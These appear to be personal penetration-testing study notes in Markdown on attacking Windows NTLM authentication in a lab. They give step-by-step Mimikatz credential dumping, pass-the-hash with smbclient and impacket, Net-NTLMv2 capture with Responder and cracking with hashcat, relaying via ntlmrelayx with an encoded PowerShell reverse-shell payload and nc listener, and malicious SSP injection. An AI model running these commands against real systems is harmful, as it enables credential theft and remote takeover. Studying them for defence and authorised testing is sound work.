---
tags: mimikatz, smbclient, impacket, responder
---
Summary:
- NTLM: unsalted hashes stored in SAM database file
- Net-NTLMv2 (formally NTLMv2): an authentication protocol that uses NTLM hash
- Cracking/Passing NTLM can be performed only if we have local Administrator privileges or higher (or via some other method)
- Cracking Net-NTLMv2 can be performed even if only have unprivileged privileges
- Relaying Net-NTLMv2 can be performed if we have local Administrator privileges OR if target system has UAC remote restrictions disabled

## Cracking NTLM

### NTLM hash implementation

Windows stores hashed user passwords in the Security Account Manager (SAM) database file, which is used to authenticate local or remote users.

On modern systems, the hashes in the SAM are stored as NTLM hashes, not salted.

We cannot just copy, rename, or move the SAM database from `C:\Windows\system32\config\sam` while the Windows operating system is running because the kernel keeps an exclusive file system lock on the file.

### Mimikatz
Tool: [Mimikatz](https://github.com/gentilkiwi/mimikatz)

- Bypasses above restriction
- Extract plaintext passwords and password hashes from various sources in Windows
- Leverage extracted information in further attacks like pass-the-hash
- *sekurlsa* module: extracts password hashes from LSASS process memory
	- LSASS: handles user authentication, password changes and access token creation in Windows
	- LSASS caches NTLM hashes and other credentials
	- LSASS runs under the SYSTEM user, even more privileged than a process started by Administrator

- **Therefore, we can only extract passwords if we are running Mimikatz as Administrator (or higher) and have *SeDebugPrivilege* access right enabled**
- **We can also elevate our privileges to the SYSTEM account with tools like *PsExec* or the built-in Mimikatz token elevation function to obtain the required privileges.**

Prerequisites: We can only extract passwords if
- running Mimikatz as Administrator or higher, and
- have *SeDebugPrivilege* access right enabled (local admin have it by default)

Methods to elevate privileges to SYSTEM account:
- tool: [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
- use built-in Mimikatz [*token elevation function*](https://github.com/gentilkiwi/mimikatz/wiki/module-~-token)
	- requires *SeImpersonationPrivilege* access right (all local administrators have it by default)

Mimikatz command format: `module::command`
E.g. `privilege::debug`

### Demo: local Windows machine

1. Check which users exist locally on the system (to identify target to obtain plain text password):
   (PowerShell) `Get-LocalUser`
2. Run PowerShell as Administrator
3. Start Mimikatz in PowerShell
4. Enable *SeDebugPrivilege* access right:
   `privilege::debug`
5. Extract information
	- Extract plaintext passwords and password hashes from all available sources: (this generated a huge amount of output)
	  `sekurlsa::logonpasswords`
	- Extract only NTLM hashes from SAM:
	  `token::elevate` to elevate to SYSTEM user privileges
	  `lsadump::sam`
6. Copy NTLM hash of target user to Kali machine
7. Retrieve correct hash mode from Hashcat's help
   `hashcat --help | grep -i "ntlm"` (1000)
8. Follow standard procedures for cracking password and use Hashcat to start the cracking (see [[Password Cracking Fundamentals]])
9. Using cracked password, connect to system as the target user via RDP.

## Passing NTLM

### Pass-the-hash (PtH)
Authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password

NTLM/LM password hashes are not salted and remain static between sessions

If we discover a password hash on one target, we can use it to authenticate to another target which has an account with the same username and password (quite common).
- Can leverage into code execution if the account has administrative privileges on the second target

Requirement:
- using local Administrator account 
	- Since Windows Vista, all Windows versions have *UAC remote restrictions* enabled by default, which disallows software or commands to be run with administrative rights on remote systems
- alternatively, the target machine needs to be configured in a certain way

Tools that support authentication with NTLM hashes:
- SMB enumeration and management: 
	- [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
	- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- Command execution:
	- scripts from [impacket](https://github.com/fortra/impacket) library like [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) and [wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)
- Other tools for other protocols like RDP and WinRM
- If the user has the required rights, can also use Mimikatz for PtH

### Demo: connecting to SMB share

Goal: Assume that we’ve already gained access to FILES01 and obtained the password (password123!) for the *gunther* user. We want to extract the Administrator’s NTLM hash and use it to authenticate to the FILES02 machine. Our goal is to gain access to a restricted SMB share and leverage pass-the-hash to obtain an interactive shell on FILES02.

Steps: 
1. Gain access to first target machine with local user account
2. Connect to SMB share by starting Windows Explorer and entering the path of the SMB share of the second target machine (e.g. `\\192.168.50.212\secrets`)
3. Enter credentials to access share -> failed (need to login with Administrator account instead)
	- If doesn't work (e.g. the *gunther* user doesn't work) it means that the credentials used are not valid on the second target machine or do not have the necessary privileges to access the share
4. Run Mimikatz in PowerShell
5. Retrieve the stored NTLM hash of Administrator from the SAM:
   `privilege::debug`
   `token::elevate`
   `lsadump::sam`
6. Use smbclient to gain access to the SMB share using NTLM hash:
   (kali) `smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`
7. After successful connection to the SMB share, list all files:
   `dir`
8. Download files:
   `get [filename]`

### Demo: obtaining an interactive shell

Goal: Continuing with the above demo, obtain an interactive shell

#### psexec.py from impacket library
Tool: psexec.py script from impacket library
- very similar to the original Sysinternals PsExec command
- searches for a writeable share and uploads an executable file to it, then registers the executable as a Windows service and starts it as SYSTEM user

Command:
`impacket-psexec -hashes [LMHash:NTHash] [username@ip] [(optional) command to execute]`

E.g. `impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`
- `-hashes [LMHash:NTHash]`: since we're only using NTLM hash, we fill LMHash with 32 0's (or anything else with 32 characters, doesn't matter)
- `Administrator@192.168.50.212`: target definition with format `username@ip`
- could specify the command to execute at the end of the command (by default, will execute **cmd.exe**)

> Note: Due to the nature of psexec.py, we’ll always receive a shell as SYSTEM instead of the user we used to authenticate.

#### wmiexec.py from impacket library
Tool: wmiexec.py from impacket library
- like psexec.py, but obtains a shell as the user we used to authenticate instead

Command:
`impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`
- Same arguments as impacket-psexec

## Cracking Net-NTLMv2

In situations where we only have unprivileged user privileges, we can abuse the Net-NTLMv2 network authentication protocol.

Net-NTLMv2 (formally NTLMv2): protocol for managing authentication process for Windows clients and servers over a network

Net-NTLMv2 vs Kerberos:
- Net-NTLMv2 is less secure than Kerberos
- Majority of Windows environments still support Net-NTLMv2 for compatibility with older devices

### Example: gain access to an SMB share on a Windows 2022 server from a Windows 11 client via Net-NTLMv2

How Net-NTLMv2 works:
1. We send the server a request, outlining the connection details to access the SMB share
2. Server sends us a challenge in which we encrypt data for our response with our NTLM hash to prove our identity
3. Server checks our challenge response and either grants or denies access

Exploit:
1. We need our target to start an authentication process using Net-NTLMv2 against a system that we control
2. Our system handles the authentication process and shows us the Net-NTLMv2 hash the target used to authenticate

Tool: [Responder](https://github.com/lgandx/Responder)
- Includes build-in SMB server that handles the authentication process for us and prints all captured Net-NTLMv2 hashes
- Also includes other protocol servers (including HTTP and FTP)
- Also includes Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS) poisoning capabilities

How to get our target remote system to authenticate with our SMB server:
- If we have obtained code execution on the target, we can command it to connect with our SMB server:
  (PowerShell) `ls \\[ip of our server]\share`
- If we do not have code execution on the target, we can use other vectors:
	- E.g. Via file upload form in a web application on a Windows server, enter a non-existing file with a UNC path like `\\[ip of our server]\share\nonexistent.txt`. If the web application supports uploads via SMB, the Windows server will authenticate to our SMB server.

Steps: (Assume we already have bind shell on target)
1. Connect to bind shell: 
   `nc 192.168.50.211 4444`
2. On bind shell, check which user is running the bind shell and if the user is in the local Administrators group:
   `whoami`
   `net user paul` (check Local Group Memberships)
   User is not in the local Administrators group, so we cannot use the methods of cracking NTLM and passing NTLM
3. On Kali, run `ip -a` to list all interfaces
4. Run Responder on Kali with sudo, using `-I` to set the listening interface:
   `sudo responder -I tap0`
5. On bind shell, request access to a non-existent SMB share on our Responder SMB server:
   `dir \\192.168.119.2\test` (test is an arbitrary directory name)
6. Check Responder for event log (should contain Client, Username, Hash)
7. Save the obtained hash
8. Retrieve the correct Hashcat mode to crack the hash:
   `hashcat --help | grep -i "ntlm"`
9. Crack the hash using Hashcat:
   `hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`
10. Confirm that the password is valid by connecting to the target machine with RDP

## Relaying Net-NTLMv2

Similar to above section, but instead of cracking the obtained hash (e.g. it is too complex), we relay the hash to another machine.

Usage example scenario: User *files02admin* is an unprivileged user in FILES01 machine. We have access to FILES01 as *files02admin*, but we cannot run Mimikatz (because unprivileged). We obtained the hash using the steps in the above section but cannot crack it. We can relay the hash to FILES02 where the user is a local Administrator. (The user is likely using the same password on both machines.) Then we can use the methods in the first two sections.

Prerequisite:
- Using local Administrator for the relay attack, or
- Target system has UAC remote restrictions disabled
- SMB signing disabled

Steps:
1. Use ntlmrelayx from impacket to perform the attack and run a command on the remote target to start a reverse shell:
   `sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."`
	- `--no-http-server`: disable HTTP server since we are using SMB connection
	- `-smb2support`: enable support for SMB
	- `-t [target ip]`: specify target ip
	- `-c [command]`: specify command to be executed on target
		- In this case, we are using a [PowerShell reverse shell one-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) (b64 encoded, note to specify our Kali listener's ip and port in the payload)
2. Start listener to catch incoming reverse shell:
   `nc -nlvp 8080`
3. In another terminal, connect to the bind shell on FILES01:
   `nc 192.168.50.211 5555`
4. Create SMB connection to Kali:
   `dir \\192.168.119.2\test` (filename is arbitrary)
5. Wait for incoming connection in our ntlmrelayx tab
6. Use reverse shell on ncat listener

## Windows Credential Guard
If this is enabled, then you can't steal cached **domain** hashes and credentials from lsass.exe memory. (note: local user hashes not affected)

Information:
- uses hardware virtualization to isolate memory of lsass.exe
- enabled by default on modern Windows installations
- two Virtual Trust Levels (VTL):
	- _VTL0_ (VSM Normal Mode): Contains the Windows environment that hosts regular user-mode processes as well as a normal kernel (_nt_) and kernel-mode data.
	- _VTL1_ (VSM Secure Mode): Contains an isolated Windows environment used for critical functionalities.
- the _Local Security Authority (LSASS)_ environment runs as a trustlet in VTL1 named _LSAISO.exe (LSA Isolated)_ and communicates with the **LSASS.exe** process running in VTL0 through an RCP channel

Check if Credential Guard is running on machine:
(PS) `Get-ComputerInfo`
- look out for 
```
DeviceGuardSecurityServicesConfigured                   : {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
DeviceGuardSecurityServicesRunning                      : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
```

### Overcoming with SSPI

Security Support Provider Interfaces (SSPI):
- an authentication mechanism of Windows
- used by all applications and services that require authentication
- SSPs provided by default: _Kerberos Security Support Provider_, _NTLM Security Support Provider_, etc.
- Methods for registering SSPs:
	- AddSecurityPackage API
	- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages` registry key: Each time the system starts up, the Local Security Authority (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.

Method:
- develop our own SSP and register it with LSASS
- could maybe force the SSPI to use our malicious SSP DLL for authentication
- log the credentials using malicious SSP DLL

Prerequisites:
- running Mimikatz as Administrator or higher, and
- have *SeDebugPrivilege* access right enabled (local admin have it by default)

Steps:
1. Connect to domain-joined machine
2. Run Mimikatz as admin
3. Inject an SSP:
   `privilege::debug`
   `misc::memssp`
4. Wait for another user to connect to machine
5. The logged credentials will be saved in **C:\Windows\System32\mimilsa.log**
6. Retrieve logged credentials:
   `type C:\Windows\System32\mimilsa.log`







